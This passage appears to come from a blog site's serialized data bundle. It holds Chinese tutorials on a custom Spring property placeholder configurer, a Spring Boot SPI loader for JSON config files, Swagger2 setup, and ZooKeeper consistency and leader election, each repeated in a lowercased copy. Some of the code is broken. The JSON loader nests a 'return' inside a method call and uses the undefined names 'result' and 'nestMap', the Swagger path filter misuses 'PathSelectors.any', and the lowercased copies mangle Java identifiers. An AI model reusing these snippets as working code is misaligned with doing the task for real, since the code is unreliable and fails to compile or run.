classpathxmlapplicationcontext("classpath:spring-component-scan.xml");\n        rabbitcomponent rabbitcomponent = (rabbitcomponent) applicationcontext.getbean("rabbitcomponent");\n        system.out.println("测试结果：" + rabbitcomponent.getanimalname());\n        // 测试结果：null\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试结果\n\n测试结果：null\n\n\n1\n\n\n\n# bean属性xml配置替换\n\n前提知识点：\n\nbeanfactorypostprocessor 接口：创建 beandefinition 之后，但在创建 bean 实例之前，提供修改 beandefinition 的机会。\n\n解析：\n\n提前准备好属性替换的 properties 配置文件。再利用 spring 自带的 beandefinition 扩展点接口（beanfactorypostprocessor），只要实现这个接口我们就可以修改 bean 的属性替换了。\n\n\n# 定义一些职责和能力\n\n 1. propertyplaceholderconfigurer，实现了 beanfactorypostprocessor 接口。从配置文件加载占位符的 key value，在 bean 实例化之前，更改属性信息。\n\n\n# 具体的实现\n\n 1. propertyplaceholderconfigurer\n\n/**\n * bean对象 占位符处理 <br/>\n * 从配置文件加载占位符的 key value，在 bean 实例化之前，更改属性信息。\n */\npublic class propertyplaceholderconfigurer \n    implements beanfactorypostprocessor {\n\n    /**\n     * 默认占位符前缀\n     */\n    public static final string default_placeholder_prefix = "${";\n\n    /**\n     * 默认占位符后缀\n     */\n    public static final string default_placeholder_suffix = "}";\n\n    private string location;\n\n    @override\n    public void postprocessbeanfactory(configurablelistablebeanfactory beanfactory) {\n        // 加载属性文件\n        defaultresourceloader resourceloader = new defaultresourceloader();\n        properties properties = new properties();\n        try {\n            properties.load(resourceloader.getresource(location).getinputstream());\n        } catch (ioexception e) {\n            throw new beansexception("could not load properties", e);\n        }\n\n        // 遍历所有bean的属性值，符合规则的替换\n        string[] beandefinitionnames = beanfactory.getbeandefinitionnames();\n        for (string beanname : beandefinitionnames) {\n            beandefinition beandefinition = beanfactory.getbeandefinition(beanname);\n            propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n            for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                object value = propertyvalue.getvalue();\n                if (!(value instanceof string)) {\n                    continue;\n                }\n                string strvalue = (string) value;\n                stringbuilder builder = new stringbuilder(strvalue);\n                int startidx = strvalue.indexof(default_placeholder_prefix);\n                int stopidx = strvalue.indexof(default_placeholder_suffix);\n                if (startidx != -1 && stopidx != -1 && startidx < stopidx) {\n                    string key = strvalue.substring(startidx + 2, stopidx);\n                    string val = properties.getproperty(key);\n                    builder.replace(startidx, stopidx + 1, val);\n                    propertyvalues.addpropertyvalue(new propertyvalue(propertyvalue.getname(), builder.tostring()));\n                }\n                propertyvalue.setvalue(builder.tostring());\n            }\n        }\n    }\n\n    public void setlocation(string location) {\n        this.location = location;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n\n# 将实现加入原有的逻辑中\n\n 1. propertyplaceholderconfigurer 实现了 beanfactorypostprocessor --\x3e spring 容器中 beandefinition 的扩展点，创建 beandefinition 之后，但在创建 bean 实例之前。修改 beandefinition 的属性。\n\n\n# 测试\n\n * xml 准备，spring-component-property.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemalocation="http://www.springframework.org/schema/context">\n\n    \x3c!--  ↓↓ spring propertyplaceholder 测试 ↓↓ --\x3e\n    \x3c!--  配置属性表达式解析器  --\x3e\n    <bean class="com.snail.springframework.beans.factory.propertyplaceholderconfigurer">\n        <property name="location" value="classpath:spring-component-property.properties"></property>\n    </bean>\n\n    \x3c!--  从xml加载bean实例  --\x3e\n    <bean id="rabbitcomponent"\n        class="com.snail.springframework.beans.factory.bean.rabbitcomponent">\n        <property name="namefrompropertyplaceholder" value="${namefrompropertyplaceholder}"></property>\n    </bean>\n\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n再准备一个配置文件：spring-component-property.properties，用于 ${namefrompropertyplaceholder} 属性替换。\n\nnamefrompropertyplaceholder=rabbit001\n\n\n1\n\n * 提前准备，还是 rabbitcomponent，这次只不过是从 xml 配置的 bean。\n\npackage com.snail.springframework.beans.factory.bean;\n\nimport com.snail.springframework.stereotype.component;\n\n@component\npublic class rabbitcomponent implements animal {\n\n    private string namefrompropertyplaceholder;\n\n    @override\n    public string getanimalname() {\n        return namefrompropertyplaceholder;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试类\n\npublic class springcomponentpropertytest {\n\n    /**\n     * 测试从配置文件加载 bean，并且完成 bean 类的 ${value} 属性替换\n     * rabbitcomponent 的属性从配置文件 ${namefrompropertyplaceholder} 完成替换\n     */\n    @test\n    public void test_scan_properties_replace() {\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring-component-property.xml");\n        rabbitcomponent rabbitcomponent = (rabbitcomponent) applicationcontext.getbean("rabbitcomponent");\n        system.out.println("测试结果：" + rabbitcomponent.getanimalname());\n        // 测试结果：rabbit001\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试结果\n\n测试结果：rabbit001\n\n\n1\n\n\n\n# 总结\n\n从外部文件加载到容器中，不管是从 xml 配置的 bean，还是从注解扫描的 bean，其实都是先组装为 beandefinition 对象。\n\n只有在首次在容器 getbean() 的时候，才将相应的 beandefinition 实例化为真正的对象。\n\n同时也知道了 beanfactorypostprocessor 接口的作用 --\x3e spring 容器中 beandefinition 的扩展点，创建 beandefinition 之后，但在创建 bean 实例之前。提供了一次修改 beandefinition 的机会。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Spring Boot 除 xml/yml 外，利用 SPI 支持对 json 配置文件的解析",frontmatter:{title:"Spring Boot 除 xml/yml 外，利用 SPI 支持对 json 配置文件的解析",date:"2022-02-17T00:00:00.000Z",tags:["SPI"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring_application_json.html",relativePath:"views/backend/spring_application_json.md",key:"v-252a8334",path:"/views/backend/spring_application_json.html",headersStr:null,content:'继上一篇JDK/Dubbo/Spring 三种SPI机制解析之后，今天就在 Spring Boot 中，利用 SPI 支持对 json 配置文件的解析。\n\nSpringBoot 的配置文件内置支持 properties、xml、yml、yaml 几种格式，其中 properties 和 xml 对应的Loader类为 PropertiesPropertySourceLoader ，yml和yaml 对应的Loader类为 YamlPropertySourceLoader。\n\n了解了 Spring SPI 机制后，观察这2个类可以发现，都实现自接口 PropertySourceLoader 。所以我们要新增支持别的格式的配置文件，就可以通过实现接口 PropertySourceLoader 来实现了。\n\n参照 PropertiesPropertySourceLoader , 下面实现了一个 json 格式的配置文件 Loader类：\n\n/**\n * JSON格式配置文件加载器\n */\npublic class JsonPropertySourceLoader implements PropertySourceLoader {\n\n    public String[] getFileExtensions() {\n        // 配置文件格式（扩展名）\n        return new String[] { "json" };\n    }\n\n    public List<PropertySource<?>> load(String name, Resource resource) throws IOException {\n        if (resource == null || !resource.exists()) {\n            return Collections.emptyList();\n        }\n        Map<String, Object> map = JSON.parseObject(resource.getInputStream(), Map.class);\n        Map<String, Object> resutltMap = new HashMap<>();\n        // 将json转为键值对\n        parseMap("", resutltMap, map);\n        return Collections.singletonList(return new MapPropertySource(name, result));\n    }\n\n    private void parseMap(String prefix, Map<String, Object> result, Map<String, Object> map) {\n        if (prefix.length() > 0) {\n            prefix += ".";\n        }\n        for (Map.Entry<String, Object> entrySet : map.entrySet()) {\n            if (entrySet.getValue() instanceof Map) {\n                nestMap(prefix + entrySet.getKey(), result, (Map<String, Object>) entrySet.getValue());\n            } else {\n                result.put(prefix + entrySet.getKey().toString(), entrySet.getValue());\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n然后在 src/main/resources 中创建 META-INF/spring.factories 文件，内容为：\n\norg.springframework.boot.env.PropertySourceLoader=\\\ncom.shanhy.sboot.property.JsonPropertySourceLoader\n\n\n1\n2\n\n\n创建测试的配置文件 application.json\n\n{\n    "custom": {\n        "property": {\n            "message": "测试数据"\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n创建验证结果的 HelloController.java\n\n@RestController\npublic class HelloController {\n\n    @Value("${custom.property.message}")\n    private Object customProperty;\n\n    @RequestMapping("/test")\n    public Object test() {\n        return customProperty;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n启动工程服务，浏览器访问 http://localhost:8080/test 即可查看输出的结果为 “测试数据”；',normalizedContent:'继上一篇jdk/dubbo/spring 三种spi机制解析之后，今天就在 spring boot 中，利用 spi 支持对 json 配置文件的解析。\n\nspringboot 的配置文件内置支持 properties、xml、yml、yaml 几种格式，其中 properties 和 xml 对应的loader类为 propertiespropertysourceloader ，yml和yaml 对应的loader类为 yamlpropertysourceloader。\n\n了解了 spring spi 机制后，观察这2个类可以发现，都实现自接口 propertysourceloader 。所以我们要新增支持别的格式的配置文件，就可以通过实现接口 propertysourceloader 来实现了。\n\n参照 propertiespropertysourceloader , 下面实现了一个 json 格式的配置文件 loader类：\n\n/**\n * json格式配置文件加载器\n */\npublic class jsonpropertysourceloader implements propertysourceloader {\n\n    public string[] getfileextensions() {\n        // 配置文件格式（扩展名）\n        return new string[] { "json" };\n    }\n\n    public list<propertysource<?>> load(string name, resource resource) throws ioexception {\n        if (resource == null || !resource.exists()) {\n            return collections.emptylist();\n        }\n        map<string, object> map = json.parseobject(resource.getinputstream(), map.class);\n        map<string, object> resutltmap = new hashmap<>();\n        // 将json转为键值对\n        parsemap("", resutltmap, map);\n        return collections.singletonlist(return new mappropertysource(name, result));\n    }\n\n    private void parsemap(string prefix, map<string, object> result, map<string, object> map) {\n        if (prefix.length() > 0) {\n            prefix += ".";\n        }\n        for (map.entry<string, object> entryset : map.entryset()) {\n            if (entryset.getvalue() instanceof map) {\n                nestmap(prefix + entryset.getkey(), result, (map<string, object>) entryset.getvalue());\n            } else {\n                result.put(prefix + entryset.getkey().tostring(), entryset.getvalue());\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n然后在 src/main/resources 中创建 meta-inf/spring.factories 文件，内容为：\n\norg.springframework.boot.env.propertysourceloader=\\\ncom.shanhy.sboot.property.jsonpropertysourceloader\n\n\n1\n2\n\n\n创建测试的配置文件 application.json\n\n{\n    "custom": {\n        "property": {\n            "message": "测试数据"\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n创建验证结果的 hellocontroller.java\n\n@restcontroller\npublic class hellocontroller {\n\n    @value("${custom.property.message}")\n    private object customproperty;\n\n    @requestmapping("/test")\n    public object test() {\n        return customproperty;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n启动工程服务，浏览器访问 http://localhost:8080/test 即可查看输出的结果为 “测试数据”；',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Swagger2 基本了解和使用",frontmatter:{title:"Swagger2 基本了解和使用",date:"2019-08-11T19:29:56.000Z",tags:["Swagger2","分布式"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/swagger2.html",relativePath:"views/backend/swagger2.md",key:"v-db03c890",path:"/views/backend/swagger2.html",headers:[{level:2,title:"入门",slug:"入门",normalizedTitle:"入门",charIndex:78},{level:2,title:"Swagger常用注解",slug:"swagger常用注解",normalizedTitle:"swagger常用注解",charIndex:84},{level:2,title:"简单在SpringBoot中搭建Swagger文档",slug:"简单在springboot中搭建swagger文档",normalizedTitle:"简单在springboot中搭建swagger文档",charIndex:99},{level:3,title:"添加依赖",slug:"添加依赖",normalizedTitle:"添加依赖",charIndex:130},{level:3,title:"在SpringBoot中添加Swagger2Config配置类",slug:"在springboot中添加swagger2config配置类",normalizedTitle:"在springboot中添加swagger2config配置类",charIndex:140},{level:3,title:"给Controller类添加Swagger注解",slug:"给controller类添加swagger注解",normalizedTitle:"给controller类添加swagger注解",charIndex:177},{level:3,title:"给model实体类添加Swagger注解",slug:"给model实体类添加swagger注解",normalizedTitle:"给model实体类添加swagger注解",charIndex:206}],excerpt:"<Boxx/>\n<p>Swagger 是一款RESTFUL接口的文档在线自动生成+功能测试功能组件，随着现在许多公司实现了前后端分离，swagger越来越受欢迎了。</p>\n",headersStr:"入门 Swagger常用注解 简单在SpringBoot中搭建Swagger文档 添加依赖 在SpringBoot中添加Swagger2Config配置类 给Controller类添加Swagger注解 给model实体类添加Swagger注解",content:'Swagger 是一款RESTFUL接口的文档在线自动生成+功能测试功能组件，随着现在许多公司实现了前后端分离，swagger越来越受欢迎了。\n\n\n\n * 入门\n * Swagger常用注解\n * 简单在SpringBoot中搭建Swagger文档\n   * 添加依赖\n   * 在SpringBoot中添加Swagger2Config配置类\n   * 给Controller类添加Swagger注解\n   * 给model实体类添加Swagger注解\n\n\n\n\n# 入门\n\n我是怎么学swagger的呢，经过我一步一步的经验，推荐以下三个网址去学习即可：\n\n * 基础篇：虽然是老外写的入门，但凭我这个英语垃圾的一批的渣渣都能看懂，相信大部分人一定可以读懂！另外作者的写作风格我很喜欢，欢迎大家去看看。传送们\n * 中极篇：一篇不错的文章，从基础到配置到实现写的很详细。传送们\n * 高级篇：mall作者，我从他这学到不少东西，非常感谢！传送们\n\n\n# Swagger常用注解\n\n注解                  说明\n@Api                用于修饰Controller类，生成Controller相关文档信息\n@ApiOperation       用于修饰Controller类中的方法，生成接口方法相关文档信息\n@ApiParam           用于修饰接口中的参数，生成接口参数相关文档信息\n@ApiModel           用于修饰Model实体类\n@ApiModelProperty   用于修饰Model实体类的属性，当实体类是请求参数或返回结果时，直接生成相关文档信息\n\n\n# 简单在SpringBoot中搭建Swagger文档\n\n * 配置完成后，通过访问http://localhost:8080/swagger-ui.html（自己的项目访问路径/swagger-ui.html）来访问接口文档就可以了。\n\n\n\n\n# 添加依赖\n\n\x3c!--Swagger-UI API文档依赖--\x3e\n<dependency>\n    <groupId>io.springfox</groupId>\n    <artifactId>springfox-swagger2</artifactId>\n    <version>2.9.2</version>\n</dependency>\n<dependency>\n    <groupId>io.springfox</groupId>\n    <artifactId>springfox-swagger-ui</artifactId>\n    <version>2.9.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 在SpringBoot中添加Swagger2Config配置类\n\n@Configuration //这是一个配置类\n@EnableSwagger2 //开启Swagger2的自动配置\npublic class Swagger2Config {\n\n    // 配置docket以配置Swagger具体参数\n    @Bean\n    public Docket docket() {\n        return new Docket(DocumentationType.SWAGGER_2)\n                .apiInfo(apiInfo())\n                // 通过.select()方法，去配置扫描接口\n                .select()\n                // 为 指定的包下的所有controller 生成API文档\n                .apis(RequestHandlerSelectors.basePackage("com.example.swaggerexample.controller"))\n                // 配置如何通过 path过滤 即这里只扫描 请求以 /user开头的接口\n                .path(PathSelectors.any("/user/**"))\n                .build();\n    }\n    \n    //不是刚需，按需配置\n    private ApiInfo apiInfo() {\n        Contact contact = new Contact("联系人名字", "http://xxx.xxx.com/联系人访问链接", "联系人邮箱");\n        return new ApiInfo("Swagger学习", // 标题\n                "学习演示如何配置Swagger", // 描述\n                "v1.0", // 版本\n                "http://terms.service.url/组织链接", // 组织链接\n                contact, // 联系人信息\n                "Apach 2.0 许可", // 许可\n                "许可链接", // 许可连接\n                new ArrayList<>()); // 扩展\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 给Controller类添加Swagger注解\n\n@Controller\n@Api(tags = "OmsOrderSettingController", description = "订单设置管理")\n@RequestMapping("/orderSetting")\npublic class OmsOrderSettingController {\n    @Autowired\n    private OmsOrderSettingService orderSettingService;\n\n    @ApiOperation("获取指定订单设置")\n    @RequestMapping(value = "/{id}", method = RequestMethod.GET)\n    @ResponseBody\n    public CommonResult<OmsOrderSetting> getItem(@PathVariable Long id) {\n        OmsOrderSetting orderSetting = orderSettingService.getItem(id);\n        return CommonResult.success(orderSetting);\n    }\n\n    @ApiOperation("修改指定订单设置")\n    @RequestMapping(value = "/update/{id}", method = RequestMethod.POST)\n    @ResponseBody\n    public CommonResult update(@PathVariable Long id, @RequestBody OmsOrderSetting orderSetting) {\n        int count = orderSettingService.update(id,orderSetting);\n        if(count>0){\n            return CommonResult.success(count);\n        }\n        return CommonResult.failed();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 给model实体类添加Swagger注解\n\n@ApiModel("用户实体")\npublic class User {\n    @ApiModelProperty("用户名")\n    private String username;\n    @ApiModelProperty("密码")\n    private String password;\n\t// 省略getter/setter\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',normalizedContent:'swagger 是一款restful接口的文档在线自动生成+功能测试功能组件，随着现在许多公司实现了前后端分离，swagger越来越受欢迎了。\n\n\n\n * 入门\n * swagger常用注解\n * 简单在springboot中搭建swagger文档\n   * 添加依赖\n   * 在springboot中添加swagger2config配置类\n   * 给controller类添加swagger注解\n   * 给model实体类添加swagger注解\n\n\n\n\n# 入门\n\n我是怎么学swagger的呢，经过我一步一步的经验，推荐以下三个网址去学习即可：\n\n * 基础篇：虽然是老外写的入门，但凭我这个英语垃圾的一批的渣渣都能看懂，相信大部分人一定可以读懂！另外作者的写作风格我很喜欢，欢迎大家去看看。传送们\n * 中极篇：一篇不错的文章，从基础到配置到实现写的很详细。传送们\n * 高级篇：mall作者，我从他这学到不少东西，非常感谢！传送们\n\n\n# swagger常用注解\n\n注解                  说明\n@api                用于修饰controller类，生成controller相关文档信息\n@apioperation       用于修饰controller类中的方法，生成接口方法相关文档信息\n@apiparam           用于修饰接口中的参数，生成接口参数相关文档信息\n@apimodel           用于修饰model实体类\n@apimodelproperty   用于修饰model实体类的属性，当实体类是请求参数或返回结果时，直接生成相关文档信息\n\n\n# 简单在springboot中搭建swagger文档\n\n * 配置完成后，通过访问http://localhost:8080/swagger-ui.html（自己的项目访问路径/swagger-ui.html）来访问接口文档就可以了。\n\n\n\n\n# 添加依赖\n\n\x3c!--swagger-ui api文档依赖--\x3e\n<dependency>\n    <groupid>io.springfox</groupid>\n    <artifactid>springfox-swagger2</artifactid>\n    <version>2.9.2</version>\n</dependency>\n<dependency>\n    <groupid>io.springfox</groupid>\n    <artifactid>springfox-swagger-ui</artifactid>\n    <version>2.9.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 在springboot中添加swagger2config配置类\n\n@configuration //这是一个配置类\n@enableswagger2 //开启swagger2的自动配置\npublic class swagger2config {\n\n    // 配置docket以配置swagger具体参数\n    @bean\n    public docket docket() {\n        return new docket(documentationtype.swagger_2)\n                .apiinfo(apiinfo())\n                // 通过.select()方法，去配置扫描接口\n                .select()\n                // 为 指定的包下的所有controller 生成api文档\n                .apis(requesthandlerselectors.basepackage("com.example.swaggerexample.controller"))\n                // 配置如何通过 path过滤 即这里只扫描 请求以 /user开头的接口\n                .path(pathselectors.any("/user/**"))\n                .build();\n    }\n    \n    //不是刚需，按需配置\n    private apiinfo apiinfo() {\n        contact contact = new contact("联系人名字", "http://xxx.xxx.com/联系人访问链接", "联系人邮箱");\n        return new apiinfo("swagger学习", // 标题\n                "学习演示如何配置swagger", // 描述\n                "v1.0", // 版本\n                "http://terms.service.url/组织链接", // 组织链接\n                contact, // 联系人信息\n                "apach 2.0 许可", // 许可\n                "许可链接", // 许可连接\n                new arraylist<>()); // 扩展\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 给controller类添加swagger注解\n\n@controller\n@api(tags = "omsordersettingcontroller", description = "订单设置管理")\n@requestmapping("/ordersetting")\npublic class omsordersettingcontroller {\n    @autowired\n    private omsordersettingservice ordersettingservice;\n\n    @apioperation("获取指定订单设置")\n    @requestmapping(value = "/{id}", method = requestmethod.get)\n    @responsebody\n    public commonresult<omsordersetting> getitem(@pathvariable long id) {\n        omsordersetting ordersetting = ordersettingservice.getitem(id);\n        return commonresult.success(ordersetting);\n    }\n\n    @apioperation("修改指定订单设置")\n    @requestmapping(value = "/update/{id}", method = requestmethod.post)\n    @responsebody\n    public commonresult update(@pathvariable long id, @requestbody omsordersetting ordersetting) {\n        int count = ordersettingservice.update(id,ordersetting);\n        if(count>0){\n            return commonresult.success(count);\n        }\n        return commonresult.failed();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 给model实体类添加swagger注解\n\n@apimodel("用户实体")\npublic class user {\n    @apimodelproperty("用户名")\n    private string username;\n    @apimodelproperty("密码")\n    private string password;\n\t// 省略getter/setter\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"ZooKeeper 如何保证一致性及如何选举",frontmatter:{title:"ZooKeeper 如何保证一致性及如何选举",date:"2022-03-08T00:00:00.000Z",tags:["分布式","ZooKeeper"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/zk%E9%80%89%E4%B8%BE%E5%92%8C%E4%B8%80%E8%87%B4%E6%80%A7.html",relativePath:"views/backend/zk选举和一致性.md",key:"v-8d6a49da",path:"/views/backend/zk%E9%80%89%E4%B8%BE%E5%92%8C%E4%B8%80%E8%87%B4%E6%80%A7.html",headers:[{level:2,title:"Zookeeper如何保证数据一致性",slug:"zookeeper如何保证数据一致性",normalizedTitle:"zookeeper如何保证数据一致性",charIndex:3},{level:2,title:"ZAB的崩溃恢复机制",slug:"zab的崩溃恢复机制",normalizedTitle:"zab的崩溃恢复机制",charIndex:25},{level:2,title:"ZAB恢复中删除数据机制",slug:"zab恢复中删除数据机制",normalizedTitle:"zab恢复中删除数据机制",charIndex:39},{level:2,title:"ZK选主过程",slug:"zk选主过程",normalizedTitle:"zk选主过程",charIndex:55},{level:2,title:"FAQ",slug:"faq",normalizedTitle:"faq",charIndex:65}],excerpt:"<Boxx/>\n",headersStr:"Zookeeper如何保证数据一致性 ZAB的崩溃恢复机制 ZAB恢复中删除数据机制 ZK选主过程 FAQ",content:" * Zookeeper如何保证数据一致性\n * ZAB的崩溃恢复机制\n * ZAB恢复中删除数据机制\n * ZK选主过程\n * FAQ\n\n\n\n\n# Zookeeper如何保证数据一致性\n\nZooKeeper保证数据一致性用的是ZAB协议。通过这个协议来进行ZooKeeper集群间的数据同步，保证数据的一致性。\n\n\n\n两阶段提交+过半写机制：\n\n 1. ZooKeeper写数据的机制是客户端 把写请求发送到leader节点上（如果发送的是follower节点，follower节点会把写请求转发到leader节点）\n 2. leader节点会把数据通过proposal请求 发送到所有节点（包括自己）\n 3. 所有到节点接受到数据以后都 持久化 会写到自己到本地磁盘上面，写好了以后会发送一个 ack 请求给leader\n 4. leader只要接受到 过半的节点发送ack响应 回来，就会发送 commit 消息给各个节点，各个节点就会把消息放入到内存中（放内存是为了保证高性能），该消息就会用户可见了。\n\n那么这个时候，如果ZooKeeper要想保证数据一致性，就需要考虑如下两个情况：\n\n * 情况一：leader执行commit了，还没来得及给follower发送commit的时候，leader宕机了，这个时候如何保证消息一致性？\n * 情况二：客户端把消息写到leader了，但是leader还没发送proposal消息给其他节点，这个时候leader宕机了，leader宕机后恢复的时候此消息又该如何处理？\n\n\n# ZAB的崩溃恢复机制\n\n针对情况一，当leader宕机以后，ZooKeeper会选举出来新的leader，新的leader启动以后要到磁盘上面去检查是否存在没有commit的消息。\n\n如果存在，就继续检查看其他follower有没有对这条消息进行了commit，如果有过半节点对这条消息进行了ack，但是没有commit，那么新leader通知follower要完成commit的操作。\n\n\n# ZAB恢复中删除数据机制\n\n针对情况二，客户端把消息写到leader了，但是leader还没发送portal消息给其他节点，这个时候leader宕机了，这个时候对于用户来说，这条消息是写失败的。\n\n假设过了一段时间以后leader节点又恢复了，不过这个时候角色就变为了follower了，它在检查自己磁盘的时候会发现自己有一条消息没有进行commit，此时就会检测消息的编号。\n\n消息是有编号的，由高32位和低32位组成，高32位是用来体现是否发生过leader切换的，低32位就是展示消息的顺序的。这个时候当前的节点就会根据高32位知道目前leader已经切换过了，所以就把当前的消息删除，然后从新的leader同步数据，这样保证了数据一致性。\n\n\n# ZK选主过程\n\n规则：\n\n 1. 初始阶段，都会给自己投票。\n\n 2. 当接收到来自其他服务器的投票时，都需要将别人的投票和自己的投票进行pk，规则如下：\n    \n    优先检查zxid。zxid比较大的服务器优先作为leader。如果zxid相同的话，就比较sid，sid比较大的服务器作为leader。\n\n举例：\n\n假设当前集群中有5台机器组成。\n\nsid（用来标识该机器在集群中的机器序号）分别为1，2，3，4，5。\n\nzxid（即zookeeper事务id号。ZooKeeper状态的每一次改变, 都对应着一个递增的Transaction id, 该id称为zxid）分别为9，9，9，8，8。\n\n并且此时sid为2的机器是leader。\n\n某一时刻，1和2的服务器挂掉了，集群开始进行选主。\n\n * 在第一次投票中，由于无法检测到集群中其他机器的状态信息，因此每台机器都将自己作为被推举的对象来进行投票。于是sid为3，4，5的机器，投票情况分别为（3，9），（4，8），（5，8）\n * 每台机器把投票发出后，同时也会接收到来自另外两台机器的投票。\n * 对于server3来说，接收到（4，8），（5，8）的投票，对比后由于自己的zxid要大于收到的另外两个投票，因此不需要做任何变更。\n * 对于server4来说，接收到（3，9），（5，8）的投票，对比后由于（3，9）这个投票的zxid大于自己，因此需要变更投票为（3，9），然后继续将这个投票发送给另外两台机器。\n * 对于server5来说，接收到（3，9），（4，8）的投票，对比后由于（3，9）这个投票的zxid大于自己，因此需要变更投票为（3，9），然后继续将这个投票发送给另外两台机器。\n * 经过第二轮投票后，集群中的每台机器都会再次受到其他机器的投票，然后开始统计投票。判断是否有过半的机器收到相同的投票信息，如果有，那么该投票的sid会成为新的leader。\n * 机器总数为5台，server3，4，5都收到投票（3，9）。因此server3成为leader。\n\n\n# FAQ\n\nQ:\n\n * 1.同一个客户端，先发出写请求，leader将写请求事务广播给follow，如果半数follow成功，但是发出请求的follow没有成功，按照半数即成功的原理，leader会返回写操作成功，此时该客户端再读取数据，导致读取到的是旧的值，不符合同一个session写后读的保证，此时该怎么办？\n\n * 2.leader对于一个事务在本地提交了，但是还没广播就down机了，那么从其余follow中选出的leader如何保证这个事务也被提交？\n   \n   zab在崩溃选择时，根据什么决定proposal该被抛弃或者该被提交？比如最开始有5台server, leader把日志复制到了另外2台，leader在本地提交日志（或者还没来得及提交），然后立即挂了。剩下4台server, 有2台有这个日志，有2台没有，那么这个日志要不要保留？\n\nA:\n\n * 1.zookeeper不保证读一致性，是弱一致性，如果要保证读到的数据是最新的，读取之前要使用sync方法\n\n * 2.旧leader commit完就挂掉了，因为写入的follower肯定超过一半，新leader具有最大zxid，因此新leader就拥有commit的proposal，这时候只要提交该proposal并进行同步即可。如果旧leader只同步了一个follower就挂掉，该follower就是新leader，新leader同步该proposal然后同步即可。如果旧leader还没来得及同步就挂掉，该proposal在新集群中也不会存在，也不会成功，因此当旧leader恢复时就会被rollback。\n   \n   只要数据被写进新leader的log了，均不会丢失，zk只要选出了leader，数据就是从leader这里为准了。leader的选举规则可以额外看看，总之就是zxid最大的当选。那么什么数据会被同步呢？只要被记录到log中的事务都不会丢失。那么可能你会疑问，如果事务没提交呢？ leader在做restore的时候，会将日志中的proposal重新广播。",normalizedContent:" * zookeeper如何保证数据一致性\n * zab的崩溃恢复机制\n * zab恢复中删除数据机制\n * zk选主过程\n * faq\n\n\n\n\n# zookeeper如何保证数据一致性\n\nzookeeper保证数据一致性用的是zab协议。通过这个协议来进行zookeeper集群间的数据同步，保证数据的一致性。\n\n\n\n两阶段提交+过半写机制：\n\n 1. zookeeper写数据的机制是客户端 把写请求发送到leader节点上（如果发送的是follower节点，follower节点会把写请求转发到leader节点）\n 2. leader节点会把数据通过proposal请求 发送到所有节点（包括自己）\n 3. 所有到节点接受到数据以后都 持久化 会写到自己到本地磁盘上面，写好了以后会发送一个 ack 请求给leader\n 4. leader只要接受到 过半的节点发送ack响应 回来，就会发送 commit 消息给各个节点，各个节点就会把消息放入到内存中（放内存是为了保证高性能），该消息就会用户可见了。\n\n那么这个时候，如果zookeeper要想保证数据一致性，就需要考虑如下两个情况：\n\n * 情况一：leader执行commit了，还没来得及给follower发送commit的时候，leader宕机了，这个时候如何保证消息一致性？\n * 